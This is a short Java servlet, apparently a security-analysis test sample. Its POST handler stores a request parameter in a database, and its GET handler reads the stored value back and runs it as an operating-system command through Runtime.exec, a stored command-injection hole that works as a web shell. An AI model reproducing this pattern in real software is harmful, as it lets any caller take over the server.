import org.springframework.beans.factory.annotation.Value;
import javax.servlet.http.*;
public class Audit extends HttpServlet {
    @Value("${app.audit.table}")
    private String table;
    JdbcTemplate jdbc;
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws Exception {
        jdbc.update("INSERT INTO " + table + " (msg) VALUES (?)", request.getParameter("m"));
    }
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws Exception {
        String m = jdbc.queryForObject("SELECT msg FROM " + table + " WHERE id = 1", String.class);
        Runtime.getRuntime().exec(m);
    }
}
